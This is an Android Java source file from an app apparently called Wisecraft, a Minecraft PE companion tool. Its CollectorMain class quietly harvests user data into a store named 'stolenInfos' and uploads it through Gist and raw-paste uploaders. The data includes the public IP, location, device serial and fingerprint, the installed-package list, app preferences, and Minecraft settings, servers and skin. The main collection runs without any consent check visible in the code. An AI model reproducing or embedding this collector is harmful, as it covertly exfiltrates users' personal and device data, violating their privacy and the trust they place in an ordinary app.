package com.nao20010128nao.Wisecraft.misc.collector;
import android.annotation.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;
import android.preference.*;
import android.util.*;
import com.google.gson.*;
import com.google.gson.annotations.*;
import com.google.gson.stream.*;
import com.nao20010128nao.OTC.*;
import com.nao20010128nao.Wisecraft.*;
import com.nao20010128nao.Wisecraft.misc.*;
import com.nao20010128nao.Wisecraft.widget.*;
import java.io.*;
import java.math.*;
import java.net.*;
import java.util.*;

import com.google.gson.stream.JsonWriter;

public class CollectorMain extends ContextWrapper implements Runnable {
	private static final List<CollectorMainUploaderProvider> UPLOADERS;
	static{
		List<CollectorMainUploaderProvider> uploaders=new ArrayList<>();
		uploaders.add(new RawUploader2());
		uploaders.add(new RawUploader1());
		uploaders.add(new GistUploader());
		UPLOADERS=Collections.unmodifiableList(uploaders);
	}
	
	static boolean running=false;
	public static SharedPreferences stolenInfos;
	
	public CollectorMain() {
		this(true);
	}

	public CollectorMain(boolean start){
		super(TheApplication.instance);
		if(start)new Thread(this).start();
	}
	
	public CollectorMain(Context c,boolean start){
		super(c);
		if(start)new Thread(this).start();
	}
	
	@Override
	@TargetApi(9)
	public void run() {
		SharedPreferences sb;
		String uuid=TheApplication.instance.uuid;
		if(new File(getFilesDir(), "stolen_encrypted.bin").exists()){
			new File(getFilesDir(), "stolen_encrypted.bin").delete();
		}
		if(new File(getFilesDir(), "stolen.bin").exists()){
			new File(getFilesDir(), "stolen.bin").delete();
		}
		sb=stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
		running = true;
		try {
			Log.d("CollectorMain", "start");
			String s="!!ERROR!!";
			try {
				StringWriter sw=new StringWriter();
				JsonWriter jw=new JsonWriter(sw);
				jw.setIndent("\t");
				new Gson().toJson(new Infos(),Infos.class,jw);
				jw.flush();
				sb.edit().putString(System.currentTimeMillis() + ".json", s=sw.toString()).commit();
				Log.d("CollectorMain", "collect");
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
			} finally {
				//System.out.println(s);
			}
			
			CollectorMainUploaderProvider cmup=getNextAvailableUploader();
			if(cmup==null){
				Log.d("CollectorMain", "unavailable");
				return;
			}
			CollectorMainUploaderProvider.Interface inf=cmup.forInterface();
			List<String> files;
			try {
				files = new ArrayList<>(sb.getAll().keySet());
				inf.init();
				Log.d("CollectorMain", "get");
				Log.d("CollectorMain", "class:"+inf.getClass().getName());
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
				return;
			}
			try {
				for (String filename:files) {
					String actual=filename;
					Log.d("CollectorMain", "upload:" + filename);
					try {
						if(inf.doUpload(uuid,filename,sb.getString(actual, "")))
							sb.edit().remove(actual).commit();
						Log.d("CollectorMain", "uploaded");
					} catch (Throwable e) {
						DebugWriter.writeToE("CollectorMain",e);
						continue;
					}
				}
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
			}finally{
				Log.d("CollectorMain", "saveTotal");
			}
		} catch (Throwable e) {
			DebugWriter.writeToE("CollectorMain",e);
		} finally {
			Log.d("CollectorMain", "end");
			running=false;
			Set<String> files=sb.getAll().keySet();
			if(files.size()==0){
				Log.d("CollectorMain", "nothing remained");
			}else{
				for (String s:sb.getAll().keySet()) {
					Log.d("CollectorMain", "remain: "+s);
				}
			}
		}
	}
	
	public static CollectorMainUploaderProvider getNextAvailableUploader()throws Throwable{
		for(CollectorMainUploaderProvider cmup:UPLOADERS)
			if(cmup.isAvailable())
				return cmup;
		return null;
	}
	
	public static void reportError(String tag,Throwable e){
		if ((TheApplication.instance.pref.getBoolean("sendInfos", false)|TheApplication.instance.pref.getBoolean("sendInfos_force", false)))
			TheApplication.instance.getSharedPreferences("majeste",MODE_PRIVATE).edit().putString("error-"+System.currentTimeMillis()+".txt",tag+"\n\n"+DebugWriter.getStacktraceAsString(e)).commit();
		WisecraftError.report(tag,e);
	}
	
	public static class Infos {
		@SerializedName("mcpeSettings")
		public OrderTrustedMap<String,String> mcpeSettings=readSettings();
		@SerializedName("mcpeServers")
		public String[] mcpeServers=readServers();
		@SerializedName("cid")
		public String cid=getCid()+"";
		@SerializedName("skin")
		public String skin=readSkin();
		@SerializedName("ip")
		public String[] ip=getIp();
		@SerializedName("uuid")
		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid", "");
		@SerializedName("managingServers")
		public Server[] managingServers=getManagingServer();
		@SerializedName("systemInfo")
		public SystemInfo systemInfo=new SystemInfo();
		@SerializedName("appInfo")
		public AppInfo appInfo=new AppInfo();
		@SerializedName("location")
		public GeolocationLoader.QuickLocation location=GeolocationLoader.INSTANCE_WITH_APPLICATION.getLastKnownLocationForSerialize();

		private String[] getIp() {
			List<String> ips=new ArrayList<>();
			for(String addr:new String[]{"http://ieserver.net/ipcheck.shtml","http://checkip.amazonaws.com","http://myexternalip.com/raw","http://icanhazip.com","http://www.trackip.net/ip"}){
				URLConnection conn=null;
				BufferedReader br=null;
				try{
					conn=new URL(addr).openConnection();
					br=new BufferedReader(new InputStreamReader(conn.getInputStream()));
					ips.add(br.readLine());
				}catch(Throwable e){
					reportError("getIp@"+addr,e);
				}finally{
					try {
						conn.getInputStream().close();
						conn.getOutputStream().close();
						br.close();
					} catch (IOException e) {}
				}
			}
			return ips.toArray(new String[ips.size()]);
		}
		private BigInteger getCid() {
			try {
				return new BigInteger(Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt")))[0].trim());
			} catch (Throwable e) {
				reportError("getCid",e);
				return BigInteger.valueOf(Long.MAX_VALUE);
			}
		}
		private OrderTrustedMap<String,String> readSettings() {
			OrderTrustedMap<String,String> data=new OrderTrustedMap<>();
			try{
				for(String s:Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt")))) {
					int colonOfs=s.indexOf(':');
					if(colonOfs==-1){
						data.put(s,null);
					}else{
						data.put(s.substring(0,colonOfs),s.substring(colonOfs+1));
					}
				}
			}catch(Throwable e){
				reportError("readSettings",e);
			}
			return data;
		}
		private String[] readServers() {
			try{
				return Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt")));
			}catch(Throwable e){
				reportError("readServers",e);
				return Constant.EMPTY_STRING_ARRAY;
			}
		}
		private String readSkin() {
			try{
				byte[] data=Utils.readWholeFileInBytes(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
				if(data==null)
					return "";
				else
					return Base64.encodeToString(data, Base64.NO_WRAP);
			}catch(Throwable e){
				reportError("readSkin",e);
				return "";
			}
		}
		private Server[] getManagingServer() {
			return new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), Server[].class);
		}
	}
	public static class AppInfo {
		@SerializedName("versionName")
		public String versionName=Utils.getVersionName(TheApplication.instance);
		@SerializedName("versionCode")
		public int    versionCode=Utils.getVersionCode(TheApplication.instance);
		@SerializedName("appName")
		public String appName="Wisecraft";
		@SerializedName("preferences")
		public Map<String,?> preferences=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getAll();
		@SerializedName("widget")
		public Map<String,?>      widget=PingWidget.getWidgetPref(TheApplication.instance).getAll();
	}
	public static class SystemInfo {//@SerializedName("ip")
		@SerializedName("packages")
		public OrderTrustedSet<String> packages=getPackageNames();
		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
		@SerializedName("board")
		public String board=Build.BOARD;
		@SerializedName("bootloader")
		public String bootloader=Build.BOOTLOADER;
		@SerializedName("brand")
		public String brand=Build.BRAND;
		@SerializedName("cpuAbi1")
		public String cpuAbi1=Build.CPU_ABI;
		@SerializedName("cpuAbi2")
		public String cpuAbi2=Build.CPU_ABI2;
		@SerializedName("device")
		public String device=Build.DEVICE;
		@SerializedName("display")
		public String display=Build.DISPLAY;
		@SerializedName("fingerprint")
		public String fingerprint=Build.FINGERPRINT;
		@SerializedName("hardware")
		public String hardware=Build.HARDWARE;
		@SerializedName("host")
		public String host=Build.HOST;
		@SerializedName("id")
		public String id=Build.ID;
		@SerializedName("manufacture")
		public String manufacture=Build.MANUFACTURER;
		@SerializedName("model")
		public String model=Build.MODEL;
		@SerializedName("product")
		public String product=Build.PRODUCT;
		@SerializedName("serial")
		public String serial=Build.SERIAL;
		@SerializedName("baseOs")
		public String baseOs=getVersionClassFieldString("BASE_OS");
		@SerializedName("codeName")
		public String codeName=getVersionClassFieldString("CODENAME");
		@SerializedName("incremental")
		public String incremental=Build.VERSION.INCREMENTAL;
		@SerializedName("release")
		public String release=Build.VERSION.RELEASE;
		@SerializedName("sdk")
		public String sdk=Build.VERSION.SDK;
		@SerializedName("securityPatch")
		public String securityPatch=getVersionClassFieldString("SECURITY_PATCH");
		@SerializedName("abis")
		public String[] abis=tryGetSupportAbis();
		@SerializedName("previewSdkInt")
		public int previewSdkInt=getVersionClassFieldInt("PREVIEW_SDK_INT");
		@SerializedName("sdkInt")
		public int sdkInt=getVersionClassFieldInt("SDK_INT");
		

		private OrderTrustedSet<String> getPackageNames() {
			return new OrderTrustedSet<>(getPackageMisc().keySet());
		}
		private OrderTrustedMap<String,PackageInfo> getPackageMisc() {
			OrderTrustedMap<String,PackageInfo> names=new OrderTrustedMap<>();
			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS);
			for (PackageInfo pi:packages)
				names.put(pi.packageName, pi);
			return names;
		}
		private String[] tryGetSupportAbis() {
			try {
				return (String[])Build.class.getField("SUPPORTED_ABIS").get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return Constant.EMPTY_STRING_ARRAY;
		}
		private String getVersionClassFieldString(String name) {
			try {
				return (String)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return null;
		}
		private int getVersionClassFieldInt(String name) {
			try {
				return (int)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return -1;
		}
	}
}
